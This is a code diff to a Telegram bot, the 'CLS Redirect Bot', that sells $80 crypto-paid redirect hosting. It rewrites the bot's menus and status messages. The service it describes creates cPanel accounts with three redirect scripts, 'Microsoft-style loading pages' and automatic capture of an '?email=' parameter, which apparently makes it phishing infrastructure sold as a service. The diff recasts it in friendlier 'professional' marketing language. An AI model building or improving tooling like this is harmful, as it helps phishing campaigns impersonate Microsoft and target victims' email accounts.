@@ -374,21 +374,29 @@ if (bot) {
     );
 
     return ctx.reply(
-      `🚀 *Welcome to CLS Redirect Bot!*`,
+      `🎯 *Welcome to CLS Redirect Bot!*\n\n` +
+      `✨ *Professional Link Redirection Service*\n` +
+      `🚀 Create instant redirect domains with advanced features\n\n` +
+      `💎 *What we offer:*\n` +
+      `• Lightning-fast redirect setup\n` +
+      `• Professional Microsoft-style loading pages\n` +
+      `• Email parameter capture support\n` +
+      `• SSL certificates included\n\n` +
+      `Choose an option below to get started:`,
       { 
         parse_mode: "Markdown",
         reply_markup: {
           inline_keyboard: [
             [
-              { text: '💳 Top Up', callback_data: 'topup' },
-              { text: '🔗 Get Redirect', callback_data: 'redirect' }
+              { text: '💳 Account Balance', callback_data: 'topup' },
+              { text: '🎯 Create Redirect', callback_data: 'redirect' }
             ],
             [
-              { text: '👤 Profile', callback_data: 'profile' },
-              { text: '📋 History', callback_data: 'history' }
+              { text: '👤 My Profile', callback_data: 'profile' },
+              { text: '📊 My Redirects', callback_data: 'history' }
             ],
             [
-              { text: '🔑 Admin Access', callback_data: 'admin_access' }
+              { text: '🔑 VIP Access Request', callback_data: 'admin_access' }
             ]
           ]
         }
@@ -401,15 +409,20 @@ if (bot) {
   // Help command
   bot.help((ctx) => {
     return ctx.reply(
-      "📋 *Available Commands:*\n\n" +
-        "/start - Start the provisioning process\n" +
-        "/help - Show this help message\n" +
-        "/cancel - Cancel current operation\n\n" +
-        "*How it works:*\n" +
-        "1. Send me your domain name\n" +
-        "2. I create a cPanel hosting account\n" +
-        "3. I set up 3 script folders with files\n" +
-        "4. You get the URLs and server IP",
+      "📋 *CLS Redirect Bot - Help Guide*\n\n" +
+        "🎯 */start* - Launch the main menu\n" +
+        "❓ */help* - Show this help guide\n" +
+        "❌ */cancel* - Cancel current operation\n\n" +
+        "✨ *How CLS Redirect Works:*\n" +
+        "1️⃣ Send your domain + target URL\n" +
+        "2️⃣ We create your redirect hosting instantly\n" +
+        "3️⃣ Get 3 professional redirect scripts\n" +
+        "4️⃣ Receive live URLs with SSL certificates\n\n" +
+        "🎨 *Features:*\n" +
+        "• Microsoft-style loading animations\n" +
+        "• Email parameter capture (?email=)\n" +
+        "• Instant SSL certificate setup\n" +
+        "• Professional redirect pages",
       { parse_mode: "Markdown" },
     );
   });
@@ -589,24 +602,30 @@ if (bot) {
           newBalance: user.balance,
           adminFree: isAdminFree
         },
-        isAdminFree ? "🎯 Starting domain provisioning request - Admin free access" : "🎯 Starting domain provisioning request - $80 deducted",
+        isAdminFree ? "🎯 Starting CLS redirect creation - VIP access" : "🎯 Starting CLS redirect creation - $80 deducted",
       );
 
       let statusMessage;
       
       if (isAdminFree) {
         statusMessage = await ctx.reply(
-          `🔄 Processing domain: *${domain}*\n\n` +
-          `🔑 Admin/Free access granted - no charge\n\n` +
-          `Request ID: \`${requestId}\`\n\nThis may take a few moments...`,
+          `🎯 *CLS Redirect Creator*\n\n` +
+          `🚀 Creating redirect for: *${domain}*\n` +
+          `🎁 *VIP Access* - Complimentary service\n\n` +
+          `⚡ *Status:* Setting up your redirect...\n` +
+          `🆔 Request ID: \`${requestId}\`\n\n` +
+          `⏳ Please wait while we work our magic...`,
           { parse_mode: "Markdown" },
         );
       } else {
         statusMessage = await ctx.reply(
-          `🔄 Processing domain: *${domain}*\n\n` +
-          `💰 $${cost} deducted from balance\n` +
-          `💳 New Balance: $${user.balance.toFixed(2)}\n\n` +
-          `Request ID: \`${requestId}\`\n\nThis may take a few moments...`,
+          `🎯 *CLS Redirect Creator*\n\n` +
+          `🚀 Creating redirect for: *${domain}*\n` +
+          `💰 Service fee: $${cost} ✅\n` +
+          `💳 Remaining balance: $${user.balance.toFixed(2)}\n\n` +
+          `⚡ *Status:* Setting up your redirect...\n` +
+          `🆔 Request ID: \`${requestId}\`\n\n` +
+          `⏳ Please wait while we work our magic...`,
           { parse_mode: "Markdown" },
         );
       }
@@ -621,7 +640,9 @@ if (bot) {
           ctx.chat.id,
           statusMessage.message_id,
           null,
-          `✅ Domain account created successfully!\n📝 Setting up redirect scripts...`,
+          `🎯 *CLS Redirect Creator*\n\n` +
+          `✅ Hosting account created successfully!\n` +
+          `🔧 Installing redirect scripts...`,
           { parse_mode: "Markdown" }
         );
 
@@ -638,7 +659,10 @@ if (bot) {
               ctx.chat.id,
               statusMessage.message_id,
               null,
-              `✅ Domain account created successfully!\n📝 Setting up redirect scripts... (${i}/3)`,
+              `🎯 *CLS Redirect Creator*\n\n` +
+              `✅ Hosting account ready!\n` +
+              `🔧 Installing redirect scripts... (${i}/3)\n` +
+              `⚡ Almost there...`,
               { parse_mode: "Markdown" }
             );
 
@@ -665,15 +689,20 @@ if (bot) {
 
         // Step 3: Replace status message with final results
         const responseMessage =
-          `🎉 *Domain provisioning completed!*\n\n` +
-          `*Domain:* ${domain}\n` +
-          `*Redirect Target:* ${redirectUrl}\n\n` +
-          `*Script URLs:*\n` +
+          `🎉 *CLS Redirect Successfully Created!*\n\n` +
+          `🌐 *Your Domain:* \`${domain}\`\n` +
+          `🎯 *Redirects To:* ${redirectUrl}\n\n` +
+          `🚀 *Live Redirect URLs:*\n` +
           urls.map((url, index) => `${index + 1}. ${url}`).join("\n") +
           "\n\n" +
-          `✅ *Setup Complete!* Your redirect scripts are now live.\n\n` +
-          `📧 *Email Parameter:* Add ?email= to autpgrab email\n` +
-          `*Example:* www.ffgfg.info/0000.html?email=1o1@mono.com/{email}`;
+          `✅ *All Systems Live!* Your redirects are now active with SSL.\n\n` +
+          `📧 *Email Capture Feature:* Add ?email= parameter\n` +
+          `*Usage:* yourlink.html?email=user@domain.com\n\n` +
+          `🎨 *Features Included:*\n` +
+          `• Professional Microsoft-style loading page\n` +
+          `• SSL certificate automatically installed\n` +
+          `• Email parameter capture ready\n` +
+          `• Lightning-fast redirect performance`;
 
         // Replace the status message with final results
         await ctx.telegram.editMessageText(
@@ -718,19 +747,28 @@ if (bot) {
               ctx.chat.id,
               statusMessage.message_id,
               null,
-              `❌ *Provisioning failed:*\n\n${error.message}\n\nPlease try again with /start`,
+              `❌ *CLS Redirect Creation Failed*\n\n` +
+              `🔧 Technical Error: ${error.message}\n\n` +
+              `💡 Don't worry! Use /start to try again.\n` +
+              `🆔 Request ID: \`${requestId}\``,
               { parse_mode: "Markdown" }
             );
           } catch (editError) {
             // If editing fails, send a new message
             await ctx.reply(
-              `❌ *Provisioning failed:*\n\n${error.message}\n\nPlease try again with /start`,
+              `❌ *CLS Redirect Creation Failed*\n\n` +
+              `🔧 Technical Error: ${error.message}\n\n` +
+              `💡 Don't worry! Use /start to try again.\n` +
+              `🆔 Request ID: \`${requestId}\``,
               { parse_mode: "Markdown" },
             );
           }
         } else {
           await ctx.reply(
-            `❌ *Provisioning failed:*\n\n${error.message}\n\nPlease try again with /start`,
+            `❌ *CLS Redirect Creation Failed*\n\n` +
+            `🔧 Technical Error: ${error.message}\n\n` +
+            `💡 Don't worry! Use /start to try again.\n` +
+            `🆔 Request ID: \`${requestId}\``,
             { parse_mode: "Markdown" },
           );
         }
@@ -761,8 +799,10 @@ if (bot) {
         session.awaiting_crypto_choice = true;
 
         return ctx.editMessageText(
-          `💳 *Top Up Your Account*\n\n` +
-          `Choose your preferred cryptocurrency:`,
+          `💎 *CLS Account Balance*\n\n` +
+          `💰 Add funds to your CLS account for redirect services\n` +
+          `🔒 Secure crypto payment options available\n\n` +
+          `Choose your preferred payment method:`,
           { 
             parse_mode: "Markdown",
             reply_markup: {
@@ -787,17 +827,18 @@ if (bot) {
         
         if (!hasAdminAccess && user.balance < requiredAmount) {
           return ctx.editMessageText(
-            `💰 *Insufficient Balance*\n\n` +
+            `💎 *CLS Redirect Service*\n\n` +
+            `💰 *Insufficient Balance*\n` +
             `Current Balance: $${user.balance.toFixed(2)}\n` +
-            `Required: $${requiredAmount.toFixed(2)}\n` +
-            `Needed: $${(requiredAmount - user.balance).toFixed(2)}\n\n` +
-            `Please top up your account first or request admin access.`,
+            `Service Cost: $${requiredAmount.toFixed(2)}\n` +
+            `Additional Needed: $${(requiredAmount - user.balance).toFixed(2)}\n\n` +
+            `💳 Please add funds to your account or request VIP access.`,
             { 
               parse_mode: "Markdown",
               reply_markup: {
                 inline_keyboard: [
-                  [{ text: '💳 Top Up', callback_data: 'topup' }],
-                  [{ text: '🔑 Admin Access', callback_data: 'admin_access' }],
+                  [{ text: '💳 Add Funds', callback_data: 'topup' }],
+                  [{ text: '🔑 Request VIP Access', callback_data: 'admin_access' }],
                   [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                 ]
               }
@@ -809,18 +850,20 @@ if (bot) {
 
         if (hasAdminAccess) {
           return ctx.editMessageText(
-            "🚀 *CLS Redirect Setup!*\n\n" +
-              "✨ Send: `domain.com redirect-url`\n" +
-              "📝 Example: `mysite.com https://fb.com`\n\n" +
-              "💎 Admin/Free access - no payment required",
+            "🎯 *CLS Redirect Creator*\n\n" +
+              "✨ *Format:* `domain.com target-url`\n" +
+              "📝 *Example:* `mysite.com https://facebook.com`\n\n" +
+              "🎁 *VIP Access Active* - Complimentary service\n" +
+              "🚀 Your redirect will be live in seconds!",
             { parse_mode: "Markdown" }
           );
         } else {
           return ctx.editMessageText(
-            "🚀 *CLS Redirect Setup!*\n\n" +
-              "✨ Send: `domain.com redirect-url`\n" +
-              "📝 Example: `mysite.com https://fb.com`\n\n" +
-              `💰 Cost: $${requiredAmount} (will be deducted from balance)`,
+            "🎯 *CLS Redirect Creator*\n\n" +
+              "✨ *Format:* `domain.com target-url`\n" +
+              "📝 *Example:* `mysite.com https://facebook.com`\n\n" +
+              `💰 *Service Cost:* $${requiredAmount}\n` +
+              "🚀 Your redirect will be live in seconds!",
             { parse_mode: "Markdown" }
           );
         }
@@ -831,13 +874,17 @@ if (bot) {
         const userHistory = provisionHistory.get(ctx.from.id) || [];
 
         return ctx.editMessageText(
-          `👤 *Your Profile*\n\n` +
-          `📱 User ID: \`${ctx.from.id}\`\n` +
-          `👋 Name: ${ctx.from.first_name || 'Unknown'}\n` +
-          `💰 Balance: $${user.balance.toFixed(2)}\n` +
-          `📅 Member since: ${user.joinDate.toDateString()}\n` +
-          `🌐 Total domains: ${userHistory.length}\n` +
-          `⭐ Status: ${user.balance > 0 ? 'Premium' : 'Free'}`,
+          `👤 *CLS Account Profile*\n\n` +
+          `🆔 Account ID: \`${ctx.from.id}\`\n` +
+          `👋 Name: ${ctx.from.first_name || 'CLS User'}\n` +
+          `💰 Account Balance: $${user.balance.toFixed(2)}\n` +
+          `📅 Member Since: ${user.joinDate.toDateString()}\n` +
+          `🎯 Total Redirects: ${userHistory.length}\n` +
+          `⭐ Account Type: ${user.balance > 0 ? '💎 Premium' : '🆓 Free Tier'}\n\n` +
+          `🚀 *CLS Services Used:*\n` +
+          `• Professional redirect pages\n` +
+          `• SSL certificate automation\n` +
+          `• Email capture integration`,
           { 
             parse_mode: "Markdown",
             reply_markup: {
@@ -854,13 +901,15 @@ if (bot) {
 
         if (userHistory.length === 0) {
           return ctx.editMessageText(
-            `📋 *Domain History*\n\n` +
-            `No domains provisioned yet.\n` +
-            `Use "🔗 Get Redirect" to create your first domain!`,
+            `📊 *CLS Redirect History*\n\n` +
+            `🎯 No redirects created yet.\n` +
+            `Ready to create your first professional redirect?\n\n` +
+            `Click "🎯 Create Redirect" to get started!`,
             { 
               parse_mode: "Markdown",
               reply_markup: {
                 inline_keyboard: [
+                  [{ text: '🎯 Create First Redirect', callback_data: 'redirect' }],
                   [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                 ]
               }
@@ -873,14 +922,16 @@ if (bot) {
           .map((domain, index) => 
             `${index + 1}. 🌐 \`${domain.domain}\`\n` +
             `   📅 ${domain.date.toDateString()}\n` +
-            `   🔗 ${domain.redirectUrl}\n`
+            `   🎯 ➜ ${domain.redirectUrl}\n`
           )
           .join('\n');
 
         return ctx.editMessageText(
-          `📋 *Domain History* (Last ${Math.min(userHistory.length, 10)})\n\n` +
+          `📊 *CLS Redirect History*\n\n` +
+          `🎯 *Recent Redirects* (Last ${Math.min(userHistory.length, 10)})\n\n` +
           historyText +
-          `\n💡 Total domains: ${userHistory.length}`,
+          `\n\n✨ Total CLS Redirects Created: ${userHistory.length}\n` +
+          `🚀 All with professional loading pages & SSL`,
           { 
             parse_mode: "Markdown",
             reply_markup: {
